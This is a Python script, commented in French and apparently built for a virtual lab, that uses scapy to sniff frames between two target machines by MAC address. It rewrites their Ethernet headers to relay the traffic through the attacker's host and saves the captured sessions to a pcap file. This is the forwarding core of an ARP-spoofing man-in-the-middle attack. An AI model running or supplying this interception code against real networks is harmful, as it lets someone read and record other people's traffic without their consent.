import scapy.all as scapy
import asyncio
import remove_checksum

class Sniffer:
    def __init__(self, interface, mac_1, mac_2):
        self.interface = interface
        self.mac_1 = mac_1
        self.mac_2 = mac_2
        self.self_ip = scapy.get_if_addr(interface)
        self.self_mac = scapy.get_if_hwaddr(interface)
        #self.filtre = f"ether host {self.mac_1} and ether host {self.mac_2} and not host {self.self_ip} and not arp"
        #self.filtre = f"((ether src {self.mac_1} or ether src {self.mac_2}) or (ether dst {self.self_mac} and not dst host {self.self_ip})) and not arp"
        # On veut un paquet qui provient soit d'un client soit de l'autre, mais pas un paquet qui nous est destiné au niveau IP
        self.filtre = f"(ether src {self.mac_1} or ether src {self.mac_2}) and not dst host {self.self_ip} and not arp"

    def packet_tranfert(self, packet):
        if packet.haslayer(scapy.Ether):
            ether = packet.getlayer(scapy.Ether)
            # Si c'est la cible 1, on envoie à la cible 2
            # Si c'est la cible 2, on envoie à la cible 1
            if ether.src == self.mac_1: ether.dst = self.mac_2
            elif ether.src == self.mac_2: ether.dst = self.mac_1
            ether.src = self.self_mac # On met notre MAC comme source pour conserver la cohérence de la table ARP

            # TODO: gérer les paquets IP avec recalcul du checksum
            paquet = remove_checksum.remove_checksum(packet)
            scapy.sendp(paquet, iface=self.interface, verbose=False)

    def packet_callback(self, packet):
        print(packet.summary())
        self.packet_tranfert(packet)

    async def start_sniffing(self):
        # capture = scapy.sniff(iface=self.interface, filter=self.filtre, prn=self.packet_callback, store=True)
        # scapy.wrpcap("sessions_sniffer.pcap", capture)
        # Utiliser AsyncSniffer pour ne pas bloquer la boucle asyncio.
        # On démarre le sniffer en arrière-plan, puis on attend indéfiniment
        # jusqu'à annulation. À l'annulation, on arrête le sniffer et on écrit
        # le pcap.
        sniffer = scapy.AsyncSniffer(iface=self.interface, filter=self.filtre, prn=self.packet_callback, store=True)
        sniffer.start()
        try:
            # attendre indéfiniment jusqu'à cancellation
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            # Lorsqu'on annule la tâche, stopper le sniffer et sauvegarder
            sniffer.stop()
            capture = sniffer.results
            scapy.wrpcap("sessions_sniffer.pcap", capture)
            # Repropager l'exception d'annulation pour que le caller sache
            raise


async def main():
    s = Sniffer("bridge100", "08:00:27:07:78:aa", "08:00:27:74:d6:4d")
    await s.start_sniffing()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Arrêt demandé par l'utilisateur")